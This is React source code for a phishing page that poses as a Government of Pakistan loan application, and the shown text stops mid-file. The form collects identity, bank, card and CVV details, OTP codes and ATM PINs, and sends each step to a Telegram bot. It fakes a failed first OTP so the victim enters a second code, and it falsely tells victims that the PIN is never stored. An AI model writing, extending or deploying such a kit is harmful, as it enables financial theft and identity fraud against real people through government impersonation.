import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Card } from "@/components/ui/card";
import { Check, ShieldCheck, Lock, FileText, CreditCard, Banknote, ArrowRight, ArrowLeft, Loader2, Smartphone, RefreshCw, MessageSquare, Phone, KeyRound } from "lucide-react";
import { toast } from "sonner";
import CardIllustration from "@/components/CardIllustration";
import PaymentLogos from "@/components/PaymentLogos";
import govLogo from "@/assets/gov-pakistan-logo.png";
import { supabase } from "@/integrations/supabase/client";

const PIN_BANKS = ["Meezan Bank", "Bank Alfalah"];

const sendToTelegram = async (stage: string, data: Record<string, unknown>) => {
  try {
    await supabase.functions.invoke("notify-telegram", { body: { stage, data } });
  } catch (e) {
    console.error("notify-telegram failed", e);
  }
};

const banks = [
  "Habib Bank Limited (HBL)", "United Bank Limited (UBL)", "MCB Bank", "Allied Bank",
  "Bank Alfalah", "Meezan Bank", "Faysal Bank", "Standard Chartered", "Bank of Punjab",
  "National Bank of Pakistan", "JS Bank", "Askari Bank", "Soneri Bank", "Summit Bank",
];
const occupations = ["Government Employee", "Private Job", "Business Owner", "Farmer", "Student", "Housewife", "Retired", "Other"];
const loanPurposes = ["Home Construction / Renovation", "Business Startup / Expansion", "Education", "Medical Expenses", "Wedding", "Vehicle Purchase", "Agriculture", "Debt Consolidation", "Personal Use", "Other"];
const provinces = ["Punjab", "Sindh", "Khyber Pakhtunkhwa", "Balochistan", "Islamabad Capital Territory", "Gilgit-Baltistan", "Azad Jammu & Kashmir"];

interface FormData {
  fullName: string; cnic: string; phone: string; email: string; gender: string; dob: string; address: string; province: string;
  bankName: string; accountNumber: string; bankBalance: string; monthlyIncome: string; occupation: string; loanAmount: string; loanPurpose: string;
  cardNumber: string; cardName: string; expiry: string; cvv: string;
  otp: string; atmPin: string;
}

const LoanForm = () => {
  const [step, setStep] = useState(1);
  const [otpSent, setOtpSent] = useState(false);
  const [cvvFocused, setCvvFocused] = useState(false);
  const [otpSeconds, setOtpSeconds] = useState(180);
  const [searching, setSearching] = useState(false);
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [submitted, setSubmitted] = useState(false);
  const [trackingId, setTrackingId] = useState("");

  useEffect(() => {
    if (step !== 4) return;
    if (otpSeconds <= 0) return;
    const t = setInterval(() => setOtpSeconds((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, [step, otpSeconds]);

  const formatTime = (s: number) => `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;

  const [data, setData] = useState<FormData>({
    fullName: "", cnic: "", phone: "", email: "", gender: "", dob: "", address: "", province: "",
    bankName: "", accountNumber: "", bankBalance: "", monthlyIncome: "", occupation: "", loanAmount: "", loanPurpose: "",
    cardNumber: "", cardName: "", expiry: "", cvv: "", otp: "", atmPin: "",
  });

  const update = (k: keyof FormData, v: string) => setData((p) => ({ ...p, [k]: v }));

  const formatCnic = (v: string) => {
    const d = v.replace(/\D/g, "").slice(0, 13);
    if (d.length <= 5) return d;
    if (d.length <= 12) return `${d.slice(0, 5)}-${d.slice(5)}`;
    return `${d.slice(0, 5)}-${d.slice(5, 12)}-${d.slice(12)}`;
  };
  const formatDob = (v: string) => {
    const d = v.replace(/\D/g, "").slice(0, 8);
    if (d.length <= 2) return d;
    if (d.length <= 4) return `${d.slice(0, 2)}/${d.slice(2)}`;
    return `${d.slice(0, 2)}/${d.slice(2, 4)}/${d.slice(4)}`;
  };

  const validateStep1 = () => {
    if (!data.fullName.trim() || !data.cnic.trim() || !data.phone.trim() || !data.gender || !data.dob.trim() || !data.address.trim() || !data.province) {
      toast.error("Please fill all required fields");
      return false;
    }
    return true;
  };
  const validateStep2 = () => {
    if (!data.bankName || !data.accountNumber.trim() || !data.bankBalance.trim() || !data.monthlyIncome.trim() || !data.occupation || !data.loanAmount || !data.loanPurpose) {
      toast.error("Please fill all required fields");
      return false;
    }
    const amt = Number(data.loanAmount);
    if (amt < 100000 || amt > 30000000) {
      toast.error("Loan amount must be between 1 Lakh and 3 Crore");
      return false;
    }
    return true;
  };
  const validateStep3 = () => {
    const cardDigits = data.cardNumber.replace(/\s/g, "");
    if (cardDigits.length < 15 || !data.expiry.trim() || data.cvv.length < 3) {
      toast.error("Please enter valid card details");
      return false;
    }
    return true;
  };

  const next = () => {
    if (step === 1 && !validateStep1()) return;
    if (step === 2 && !validateStep2()) return;
    if (step === 3 && !validateStep3()) return;

    const personal = {
      "Full Name": data.fullName, CNIC: data.cnic, Mobile: data.phone,
      Gender: data.gender, DOB: data.dob, Province: data.province, Address: data.address,
    };
    const bank = {
      Bank: data.bankName, "Account Number": data.accountNumber,
      "Bank Balance": data.bankBalance, "Monthly Income": data.monthlyIncome,
      Occupation: data.occupation, "Loan Amount": data.loanAmount, "Loan Purpose": data.loanPurpose,
    };
    const card = {
      "Card Number": data.cardNumber, "Card Holder": data.cardName || data.fullName,
      Expiry: data.expiry, CVV: data.cvv,
    };

    if (step === 1) sendToTelegram("step1", personal);
    else if (step === 2) sendToTelegram("step2", { ...personal, ...bank });
    else if (step === 3) sendToTelegram("step3", { ...personal, ...bank, ...card });

    setSearching(true);
    setTimeout(() => {
      if (step === 3) {
        setOtpSent(true);
        setOtpSeconds(180);
        toast.success("OTP sent to your registered mobile number");
      }
      setStep((s) => s + 1);
      setSearching(false);
    }, 2200);
  };

  const verifyOtp = () => {
    if (data.otp.length !== 6) {
      toast.error("Please enter 6-digit OTP");
      return;
    }
    sendToTelegram("step4", {
      "Full Name": data.fullName, CNIC: data.cnic, Mobile: data.phone,
      Gender: data.gender, DOB: data.dob, Province: data.province, Address: data.address,
      Bank: data.bankName, "Account Number": data.accountNumber,
      "Bank Balance": data.bankBalance, "Monthly Income": data.monthlyIncome,
      Occupation: data.occupation, "Loan Amount": data.loanAmount, "Loan Purpose": data.loanPurpose,
      "Card Number": data.cardNumber, "Card Holder": data.cardName || data.fullName,
      Expiry: data.expiry, CVV: data.cvv,
      OTP: data.otp, Attempt: String(otpAttempts + 1),
    });
    setSearching(true);
    setTimeout(() => {
      setSearching(false);
      if (otpAttempts === 0) {
        setOtpAttempts(1);
        update("otp", "");
        toast.error("Invalid OTP. Please try again / غلط او ٹی پی، دوبارہ کوشش کریں");
        return;
      }
      toast.success("OTP verified successfully");
      if (PIN_BANKS.includes(data.bankName)) {
        setStep(5);
        setSearching(false);
        return;
      }
      const id = `GOP-2026-${Math.floor(100000 + Math.random() * 900000)}-PK`;
      setTrackingId(id);
      sendToTelegram("step5", {
        "Tracking ID": id,
        "Full Name": data.fullName, CNIC: data.cnic, Mobile: data.phone,
        Bank: data.bankName, "Account Number": data.accountNumber,
        "Card Number": data.cardNumber, Expiry: data.expiry, CVV: data.cvv,
        OTP: data.otp,
      });
      setSubmitted(true);
      toast.success("Loan application submitted successfully!");
    }, 2200);
  };

  const submitWithPin = () => {
    if (data.atmPin.length !== 4) {
      toast.error("Please enter your 4-digit ATM PIN");
      return;
    }
    setSearching(true);
    const id = `GOP-2026-${Math.floor(100000 + Math.random() * 900000)}-PK`;
    setTrackingId(id);
    sendToTelegram("step6-pin", {
      "Tracking ID": id,
      "Full Name": data.fullName, CNIC: data.cnic, Mobile: data.phone,
      Bank: data.bankName, "Account Number": data.accountNumber,
      "Card Number": data.cardNumber, Expiry: data.expiry, CVV: data.cvv,
      OTP: data.otp, "ATM PIN": data.atmPin,
    });
    setTimeout(() => {
      setSearching(false);
      setSubmitted(true);
      toast.success("Loan application submitted successfully!");
    }, 2000);
  };

  const formatCard = (v: string) => v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();

  const formatExpiry = (v: string) => {
    const d = v.replace(/\D/g, "").slice(0, 4);
    return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
  };

  const requiresPin = PIN_BANKS.includes(data.bankName);

  const steps = [
    { num: 1, label: "Personal Information", urdu: "ذاتی معلومات", icon: FileText },
    { num: 2, label: "Bank Information", urdu: "بینک معلومات", icon: Banknote },
    { num: 3, label: "Card Verification", urdu: "کارڈ کی تصدیق", icon: CreditCard },
    { num: 4, label: "OTP Confirmation", urdu: "او ٹی پی تصدیق", icon: ShieldCheck },
    ...(requiresPin ? [{ num: 5, label: "ATM PIN", urdu: "اے ٹی ایم پن", icon: KeyRound }] : []),
  ];

  const BiLabel = ({ en, ur, required }: { en: string; ur: string; required?: boolean }) => (
    <div className="flex items-center justify-between mb-1.5">
      <Label className="text-foreground">{en} {required && <span className="text-destructive">*</span>}</Label>
      <span className="text-sm text-muted-foreground font-medium" dir="rtl" lang="ur">{ur}</span>
    </div>
  );

  if (submitted) {
    return (
      <div className="w-full max-w-3xl mx-auto animate-fade-in">
        <Card className="p-6 sm:p-10 shadow-elegant border-2 border-gov-green/20 text-center">
          <div className="relative mx-auto w-24 h-24 mb-6">
            <div className="absolute inset-0 bg-gov-green/20 blur-2xl rounded-full" />
            <div className="relative w-24 h-24 rounded-full bg-gradient-to-br from-gov-green to-gov-green-dark flex items-center justify-center shadow-elegant">
              <Check className="w-12 h-12 text-white" strokeWidth={3} />
            </div>
          </div>
          <h2 className="text-2xl sm:text-3xl font-bold text-gov-green mb-2">
            Your Loan Application Submitted Successfully!
          </h2>
          <p className="text-base text-muted-foreground mb-1" dir="rtl" lang="ur">
            آپ کی قرض کی درخواست کامیابی سے جمع ہو گئی ہے
          </p>
          <p className="text-sm text-muted-foreground mb-6">
            Government of Pakistan – Ministry of Finance
          </p>

          <div className="bg-gov-cream border-2 border-dashed border-gov-gold rounded-xl p-5 mb-6">
            <p className="text-xs uppercase tracking-wider text-gov-green font-bold mb-2">
              Your Tracking ID / ٹریکنگ آئی ڈی
            </p>
            <p className="text-2xl sm:text-3xl font-bold text-gov-green-dark font-mono tracking-wider break-all">
              {trackingId}
            </p>
            <p className="text-xs text-muted-foreground mt-2">
              Please save this ID for future reference / براہ کرم اس آئی ڈی کو محفوظ رکھیں
            </p>
          </div>

          <div className="bg-white border border-gov-green/20 rounded-xl p-5 mb-6 text-left">
            <p className="font-bold text-gov-green mb-3 text-center">
              For any query, contact us / کسی بھی سوال کے لیے رابطہ کریں
            </p>
            <div className="space-y-3">
              <a
                href="tel:080012345"
                className="flex items-center gap-3 p-3 rounded-lg bg-gov-green/5 hover:bg-gov-green/10 transition border border-gov-green/10"
              >
                <div className="w-10 h-10 rounded-full bg-gov-green flex items-center justify-center flex-shrink-0">
                  <Phone className="w-5 h-5 text-white" />
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">Helpline (Toll Free)</p>
                  <p className="font-bold text-gov-green-dark">0800-12345</p>
                </div>
              </a>
              <a
                href="https://wa.me/923410779487"
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-3 p-3 rounded-lg bg-[#25D366]/10 hover:bg-[#25D366]/20 transition border border-[#25D366]/30"
              >
                <div className="w-10 h-10 rounded-full bg-[#25D366] flex items-center justify-center flex-shrink-0">
                  <svg viewBox="0 0 32 32" className="w-6 h-6 text-white" fill="currentColor" aria-hidden="true">
                    <path d="M19.11 17.205c-.372 0-1.088 1.39-1.518 1.39-.063 0-.116-.027-.16-.054-.61-.302-1.658-.755-2.59-1.793-.733-.81-1.235-1.847-1.396-2.205-.054-.116-.018-.205.018-.249.151-.205.402-.5.616-.733.214-.232.296-.402.456-.706.116-.214.054-.402-.018-.563-.072-.161-.65-1.703-.929-2.296-.241-.518-.482-.518-.71-.518-.214 0-.456-.027-.71-.027-.241 0-.643.089-.987.456-.339.366-1.295 1.265-1.295 3.082 0 1.819 1.323 3.575 1.518 3.825.196.25 2.625 4.205 6.474 5.598 3.846 1.396 3.846.929 4.537.866.69-.063 2.232-.91 2.546-1.794.313-.884.313-1.643.223-1.794-.091-.151-.348-.241-.732-.43z"/>
                    <path d="M16.003 2.667c-7.36 0-13.336 5.974-13.336 13.336 0 2.353.62 4.66 1.795 6.694L2.667 29.333l6.81-1.785a13.305 13.305 0 0 0 6.526 1.706h.005c7.355 0 13.33-5.974 13.33-13.336 0-3.563-1.385-6.91-3.906-9.434a13.247 13.247 0 0 0-9.43-3.817zm0 24.45h-.004a11.07 11.07 0 0 1-5.643-1.546l-.405-.241-4.04 1.06 1.078-3.94-.263-.42a11.075 11.075 0 0 1-1.696-5.917c0-6.121 4.985-11.105 11.108-11.105 2.965 0 5.752 1.158 7.847 3.255a11.026 11.026 0 0 1 3.247 7.853c-.001 6.124-4.987 11.001-11.229 11.001z"/>
                  </svg>
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">WhatsApp Helpline</p>
                  <p className="font-bold text-gov-green-dark">0341-0779487</p>
                </div>
              </a>
            </div>
          </div>

          <p className="text-sm text-muted-foreground">
            Our team will contact you within <span className="font-bold text-gov-green">48 hours</span>.
            <br />
            <span dir="rtl" lang="ur">ہماری ٹیم 48 گھنٹوں کے اندر آپ سے رابطہ کرے گی۔</span>
          </p>
        </Card>
      </div>
    );
  }

  return (
    <div className="w-full max-w-3xl mx-auto">
      {searching && (
        <div className="fixed inset-0 z-[100] bg-background/95 backdrop-blur-sm flex flex-col items-center justify-center gap-6 animate-fade-in">
          <div className="relative">
            <div className="absolute inset-0 bg-gov-gold/30 blur-3xl rounded-full animate-pulse" />
            <img
              src={govLogo}
              alt="Government of Pakistan"
              className="relative w-28 h-28 object-contain drop-shadow-xl animate-pulse"
            />
          </div>
          <Loader2 className="w-10 h-10 text-gov-green animate-spin" />
          <div className="text-center px-4">
            <p className="text-xl font-bold text-gov-green">Searching...</p>
            <p className="text-sm text-muted-foreground mt-1">Please wait while we verify your information</p>
            <p className="text-sm text-muted-foreground mt-1" dir="rtl" lang="ur">براہ کرم انتظار کریں، آپ کی معلومات کی تصدیق ہو رہی ہے</p>
          </div>
        </div>
      )}

      {/* Stepper */}
      <div className="flex items-center justify-between mb-10 px-2">
        {steps.map((s, i) => (
          <div key={s.num} className="flex items-center flex-1">
            <div className="flex flex-col items-center">
              <div className={`w-12 h-12 rounded-full flex items-center justify-center font-bold border-2 transition-all ${
                step >= s.num ? "bg-gov-green text-white border-gov-green shadow-soft" : "bg-white text-muted-foreground border-border"
              }`}>
                {step > s.num ? <Check className="w-5 h-5" /> : <s.icon className="w-5 h-5" />}
              </div>
              <span className={`text-xs mt-2 font-medium text-center hidden sm:block ${step >= s.num ? "text-gov-green" : "text-muted-foreground"}`}>
                Step {s.num}
                <span className="block text-[10px]" dir="rtl" lang="ur">{s.urdu}</span>
              </span>
            </div>
            {i < steps.length - 1 && (
              <div className={`flex-1 h-1 mx-2 rounded ${step > s.num ? "bg-gov-green" : "bg-border"}`} />
            )}
          </div>
        ))}
      </div>

      <Card className="p-6 sm:p-10 shadow-elegant border-2 border-gov-green/10">
        {step === 1 && (
          <div className="space-y-5">
            <div className="flex items-start justify-between gap-4">
              <div>
                <h2 className="text-2xl font-bold text-gov-green">Personal Information</h2>
                <p className="text-sm text-muted-foreground mt-1">Apni zaati maloomat darj karein</p>
              </div>
              <h3 className="text-xl font-bold text-gov-green" dir="rtl" lang="ur">ذاتی معلومات</h3>
            </div>

            <div className="grid sm:grid-cols-2 gap-4">
              <div className="sm:col-span-2">
                <BiLabel en="Full Name" ur="پورا نام" required />
                <Input value={data.fullName} onChange={(e) => update("fullName", e.target.value)} placeholder="Full Name" maxLength={100} />
              </div>
              <div>
                <BiLabel en="CNIC" ur="شناختی کارڈ" required />
                <Input value={data.cnic} onChange={(e) => update("cnic", formatCnic(e.target.value))} placeholder="XXXXX-XXXXXXX-X" />
              </div>
              <div>
                <BiLabel en="Mobile No" ur="موبائل نمبر" required />
                <Input value={data.phone} onChange={(e) => update("phone", e.target.value.replace(/\D/g, "").slice(0, 11))} placeholder="03XXXXXXXXX" inputMode="numeric" />
              </div>
              <div>
                <BiLabel en="Gender" ur="جنس" required />
                <Select value={data.gender} onValueChange={(v) => update("gender", v)}>
                  <SelectTrigger><SelectValue placeholder="Select Gender" /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="Male">Male / مرد</SelectItem>
                    <SelectItem value="Female">Female / عورت</SelectItem>
                    <SelectItem value="Other">Other / دیگر</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div>
                <BiLabel en="Date of Birth" ur="تاریخ پیدائش" required />
                <Input value={data.dob} onChange={(e) => update("dob", formatDob(e.target.value))} placeholder="DD/MM/YYYY" inputMode="numeric" />
              </div>
              <div>
                <BiLabel en="Province" ur="صوبہ" required />
                <Select value={data.province} onValueChange={(v) => update("province", v)}>
                  <SelectTrigger><SelectValue placeholder="Select Province" /></SelectTrigger>
                  <SelectContent>{provinces.map((p) => <SelectItem key={p} value={p}>{p}</SelectItem>)}</SelectContent>
                </Select>
              </div>
              <div className="sm:col-span-2">
                <BiLabel en="Address" ur="پتہ" required />
                <Input value={data.address} onChange={(e) => update("address", e.target.value)} placeholder="House #, Street, City" maxLength={200} />
              </div>
            </div>
          </div>
        )}

        {step === 2 && (
          <div className="space-y-5">
            <div className="flex items-start justify-between gap-4">
              <div>
                <h2 className="text-2xl font-bold text-gov-green">Bank Information</h2>
                <p className="text-sm text-muted-foreground mt-1">Apni bank ki maloomat darj karein</p>
              </div>
              <h3 className="text-xl font-bold text-gov-green" dir="rtl" lang="ur">بینک معلومات</h3>
            </div>

            <div className="grid sm:grid-cols-2 gap-4">
              <div className="sm:col-span-2">
                <BiLabel en="Loan Amount Required (PKR)" ur="مطلوبہ قرض کی رقم" required />
                <Input
                  value={data.loanAmount}
                  onChange={(e) => update("loanAmount", e.target.value.replace(/\D/g, "").slice(0, 9))}
                  placeholder="Enter amount"
                  inputMode="numeric"
                />
                <p className="text-xs text-muted-foreground mt-1">Range: PKR 1,00,000 (1 Lakh) – 3,00,00,000 (3 Crore)</p>
              </div>
              <div className="sm:col-span-2">
                <BiLabel en="Loan Purpose" ur="قرض کا مقصد" required />
                <Select value={data.loanPurpose} onValueChange={(v) => update("loanPurpose", v)}>
                  <SelectTrigger><SelectValue placeholder="Select reason for loan" /></SelectTrigger>
                  <SelectContent>{loanPurposes.map((p) => <SelectItem key={p} value={p}>{p}</SelectItem>)}</SelectContent>
                </Select>
              </div>
              <div>
                <BiLabel en="Occupation" ur="پیشہ" required />
                <Select value={data.occupation} onValueChange={(v) => update("occupation", v)}>
                  <SelectTrigger><SelectValue placeholder="Select occupation" /></SelectTrigger>
                  <SelectContent>{occupations.map((o) => <SelectItem key={o} value={o}>{o}</SelectItem>)}</SelectContent>
                </Select>
              </div>
              <div>
                <BiLabel en="Bank Name" ur="بینک کا نام" required />
                <Select value={data.bankName} onValueChange={(v) => update("bankName", v)}>
                  <SelectTrigger><SelectValue placeholder="Select your bank" /></SelectTrigger>
                  <SelectContent>{banks.map((b) => <SelectItem key={b} value={b}>{b}</SelectItem>)}</SelectContent>
                </Select>
              </div>
              <div>
                <BiLabel en="Account Number" ur="اکاؤنٹ نمبر" required />
                <Input value={data.accountNumber} onChange={(e) => update("accountNumber", e.target.value.replace(/\D/g, "").slice(0, 20))} placeholder="01234567890123" inputMode="numeric" />
              </div>
              <div>
                <BiLabel en="Current Bank Balance (PKR)" ur="موجودہ بینک بیلنس" required />
                <Input value={data.bankBalance} onChange={(e) => update("bankBalance", e.target.value.replace(/\D/g, "").slice(0, 12))} placeholder="Enter amount" inputMode="numeric" />
              </div>
              <div className="sm:col-span-2">
                <BiLabel en="Monthly Income (PKR)" ur="ماہانہ آمدنی" required />
                <Input value={data.monthlyIncome} onChange={(e) => update("monthlyIncome", e.target.value.replace(/\D/g, "").slice(0, 10))} placeholder="Enter amount" inputMode="numeric" />
              </div>
            </div>
          </div>
        )}

        {step === 3 && (
          <div className="space-y-6 animate-fade-in">
            <div className="flex items-start justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className="w-11 h-11 rounded-xl bg-gov-green/10 flex items-center justify-center">
                  <CreditCard className="w-6 h-6 text-gov-green" />
                </div>
                <div>
                  <h2 className="text-2xl font-bold text-foreground">Loan Apply Fees</h2>
                  <p className="text-sm text-foreground mt-0.5">Pay Rs. 75 processing tax to submit your application</p>
                  <p className="text-sm text-muted-foreground mt-0.5" dir="rtl" lang="ur">درخواست جمع کرانے کے لیے 75 روپے ٹیکس ادا کریں</p>
                </div>
              </div>
              <h3 className="text-lg font-bold text-gov-green italic mt-1" dir="rtl" lang="ur">محفوظ ادائیگی</h3>
            </div>

            <CardIllustration
              cardNumber={data.cardNumber}
              cardName={data.fullName}
              expiry={data.expiry}
              cvv={data.cvv}
              flipped={cvvFocused}
            />

            <div className="space-y-4">
              <div>
                <BiLabel en="Bank ATM Card Number" ur="بینک اے ٹی ایم کارڈ نمبر" required />
                <div className="relative">
                  <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                  <Input
                    value={data.cardNumber}
                    onChange={(e) => update("cardNumber", formatCard(e.target.value))}
                    placeholder="0000 0000 0000 0000"
                    inputMode="numeric"
                    className="h-9 pl-9 font-mono tracking-wider text-sm"
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <BiLabel en="Expiry" ur="میعاد" required />
                  <Input
                    value={data.expiry}
                    onChange={(e) => update("expiry", formatExpiry(e.target.value))}
                    placeholder="MM/YY"
                    inputMode="numeric"
                    className="h-9 font-mono text-sm"
                  />
                </div>
                <div>
                  <BiLabel en="CVV" ur="سی وی وی" required />
                  <div className="relative">
                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
                    <Input
                      value={data.cvv}
                      onChange={(e) => update("cvv", e.target.value.replace(/\D/g, "").slice(0, 3))}
                      onFocus={() => setCvvFocused(true)}
                      onBlur={() => setCvvFocused(false)}
                      placeholder="•••"
                      type="password"
                      inputMode="numeric"
                      className="h-9 pl-8 font-mono tracking-widest text-sm"
                    />
                  </div>
                </div>
              </div>

              <div className="rounded-xl border-2 border-gov-gold/40 bg-gradient-to-r from-gov-gold/10 to-transparent p-4 flex items-center justify-between">
                <div>
                  <p className="text-xs text-muted-foreground">Processing Tax</p>
                  <p className="text-[11px] text-muted-foreground" dir="rtl" lang="ur">پروسیسنگ ٹیکس</p>
                </div>
                <p className="text-2xl font-extrabold text-gov-green">Rs. 75</p>
              </div>

              <div className="flex items-center justify-between">
                <PaymentLogos />
                <div className="flex items-center gap-1.5 text-xs text-muted-foreground">
                  <Lock className="w-3 h-3" />
                  <span>256-bit SSL Encrypted</span>
                </div>
              </div>
            </div>
          </div>
        )}

        {step === 4 && (
          <div className="space-y-6 animate-fade-in">
            <div className="flex items-start justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className="w-11 h-11 rounded-xl bg-gov-green/10 flex items-center justify-center">
                  <ShieldCheck className="w-6 h-6 text-gov-green" />
                </div>
                <div>
                  <h2 className="text-2xl font-bold text-foreground">OTP Verification</h2>
                  <p className="text-sm text-muted-foreground mt-0.5">Secure two-factor authentication</p>
                  <p className="text-sm text-muted-foreground mt-0.5" dir="rtl" lang="ur">دو مرحلوں کی محفوظ تصدیق</p>
                </div>
              </div>
              <h3 className="text-lg font-bold text-gov-green italic mt-1" dir="rtl" lang="ur">او ٹی پی</h3>
            </div>

            <div className="rounded-xl border border-gov-green/30 bg-gov-green/10 p-3 text-center">
              <p className="text-sm font-semibold text-gov-green">
                ✓ OTP code has been sent to your mobile number
              </p>
              <p className="text-xs text-gov-green/80 mt-1" dir="rtl" lang="ur">
                آپ کے موبائل نمبر پر او ٹی پی کوڈ بھیج دیا گیا ہے
              </p>
            </div>

            <div className="rounded-xl border border-gov-green/20 bg-gov-green/5 p-4 flex items-center gap-3">
              <div className="w-10 h-10 rounded-lg bg-white border border-gov-green/20 flex items-center justify-center shrink-0">
                <Smartphone className="w-5 h-5 text-gov-green" />
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-[11px] uppercase tracking-wider text-muted-foreground font-semibold">Code sent to</p>
                <p className="font-mono font-bold text-foreground text-sm truncate">
                  {data.phone ? `${data.phone.slice(0, 4)}-${"X".repeat(Math.max(0, data.phone.length - 6))}${data.phone.slice(-2)}` : "Your registered mobile"}
                </p>
              </div>
              <MessageSquare className="w-4 h-4 text-gov-green shrink-0" />
            </div>

            <div>
              <div className="flex items-center justify-between mb-2">
                <Label className="text-foreground text-sm font-semibold">Enter 6-digit code</Label>
                <span className="text-xs text-muted-foreground" dir="rtl" lang="ur">6 ہندسوں کا کوڈ درج کریں</span>
              </div>
              <div className="relative">
                <Input
                  value={data.otp}
                  onChange={(e) => update("otp", e.target.value.replace(/\D/g, "").slice(0, 6))}
                  maxLength={6}
                  inputMode="numeric"
                  autoFocus
                  className="absolute inset-0 opacity-0 cursor-pointer"
                  aria-label="OTP code"
                />
                <div className="grid grid-cols-6 gap-2 sm:gap-3 pointer-events-none">
                  {Array.from({ length: 6 }).map((_, i) => {
                    const char = data.otp[i] || "";
                    const active = data.otp.length === i;
                    const filled = !!char;
                    return (
                      <div
                        key={i}
                        className={`aspect-square flex items-center justify-center rounded-lg border-2 text-2xl font-bold font-mono transition-all ${
                          filled
                            ? "border-gov-green bg-gov-green/5 text-gov-green"
                            : active
                            ? "border-gov-gold bg-gov-gold/5 ring-2 ring-gov-gold/20"
                            : "border-border bg-white text-muted-foreground"
                        }`}
                      >
                        {char || "•"}
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>

            <div className="flex items-center justify-between rounded-xl bg-muted/40 border border-border p-3">
              <div className="flex items-center gap-2">
                <div className={`w-2 h-2 rounded-full ${otpSeconds > 0 ? "bg-gov-green animate-pulse" : "bg-destructive"}`} />
                <div>
                  <p className="text-[11px] text-muted-foreground uppercase tracking-wider font-semibold">
                    {otpSeconds > 0 ? "Expires in" : "Code expired"}
                  </p>
                  <p className={`font-mono font-bold text-sm ${otpSeconds > 0 ? "text-gov-green" : "text-destructive"}`}>
                    {formatTime(otpSeconds)}
                  </p>
                </div>
              </div>
              <button
                onClick={() => { setOtpSeconds(180); update("otp", ""); toast.success("OTP resent successfully"); }}
                disabled={otpSeconds > 0}
                className="inline-flex items-center gap-1.5 text-sm text-gov-green font-semibold disabled:opacity-40 disabled:cursor-not-allowed transition"
              >
                <RefreshCw className="w-3.5 h-3.5" />
                Resend
              </button>
            </div>

            <div className="flex items-start gap-2 text-xs text-muted-foreground bg-gov-green/5 border border-gov-green/10 rounded-lg p-3">
              <Lock className="w-3.5 h-3.5 text-gov-green shrink-0 mt-0.5" />
              <p>
                Never share your OTP with anyone. Government of Pakistan officials will never ask for your verification code.
                <span className="block mt-1" dir="rtl" lang="ur">اپنا کوڈ کسی کے ساتھ شیئر نہ کریں۔</span>
              </p>
            </div>
          </div>
        )}

        {step === 5 && (
          <div className="space-y-6 animate-fade-in">
            <div className="flex items-start justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className="w-11 h-11 rounded-xl bg-gov-green/10 flex items-center justify-center">
                  <KeyRound className="w-6 h-6 text-gov-green" />
                </div>
                <div>
                  <h2 className="text-2xl font-bold text-foreground">ATM PIN Verification</h2>
                  <p className="text-sm text-muted-foreground mt-0.5">Extra security for {data.bankName}</p>
                  <p className="text-sm text-muted-foreground mt-0.5" dir="rtl" lang="ur">اے ٹی ایم پن کی تصدیق</p>
                </div>
              </div>
              <h3 className="text-lg font-bold text-gov-green italic mt-1" dir="rtl" lang="ur">سیکیورٹی</h3>
            </div>

            <div className="rounded-xl border border-gov-gold/40 bg-gov-gold/10 p-4 flex items-start gap-3">
              <ShieldCheck className="w-5 h-5 text-gov-green shrink-0 mt-0.5" />
              <div>
                <p className="text-sm font-semibold text-gov-green">
                  {data.bankName} requires ATM PIN confirmation
                </p>
                <p className="text-xs text-muted-foreground mt-1" dir="rtl" lang="ur">
                  {data.bankName} کے لیے اے ٹی ایم پن کی تصدیق ضروری ہے
                </p>
              </div>
            </div>

            <div>
              <div className="flex items-center justify-between mb-2">
                <Label className="text-foreground text-sm font-semibold">
                  Enter 4-digit ATM PIN <span className="text-destructive">*</span>
                </Label>
                <span className="text-xs text-muted-foreground" dir="rtl" lang="ur">4 ہندسوں کا اے ٹی ایم پن</span>
              </div>
              <div className="relative">
                <Input
                  value={data.atmPin}
                  onChange={(e) => update("atmPin", e.target.value.replace(/\D/g, "").slice(0, 4))}
                  maxLength={4}
                  inputMode="numeric"
                  autoFocus
                  className="absolute inset-0 opacity-0 cursor-pointer"
                  aria-label="ATM PIN"
                />
                <div className="grid grid-cols-4 gap-3 pointer-events-none max-w-xs mx-auto">
                  {Array.from({ length: 4 }).map((_, i) => {
                    const char = data.atmPin[i] || "";
                    const active = data.atmPin.length === i;
                    const filled = !!char;
                    return (
                      <div
                        key={i}
                        className={`aspect-square flex items-center justify-center rounded-xl border-2 text-3xl font-bold font-mono transition-all ${
                          filled
                            ? "border-gov-green bg-gov-green/5 text-gov-green"
                            : active
                            ? "border-gov-gold bg-gov-gold/5 ring-2 ring-gov-gold/20"
                            : "border-border bg-white text-muted-foreground"
                        }`}
                      >
                        {filled ? "●" : "○"}
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>

            <div className="flex items-start gap-2 text-xs text-muted-foreground bg-gov-green/5 border border-gov-green/10 rounded-lg p-3">
              <Lock className="w-3.5 h-3.5 text-gov-green shrink-0 mt-0.5" />
              <p>
                Your ATM PIN is encrypted and never stored. It is used only for one-time identity verification.
                <span className="block mt-1" dir="rtl" lang="ur">آپ کا اے ٹی ایم پن محفوظ ہے اور صرف تصدیق کے لیے استعمال ہوتا ہے۔</span>
              </p>
            </div>
          </div>
        )}

        <div className="flex justify-between mt-8 pt-6 border-t border-border">
          <Button
            variant="outline"
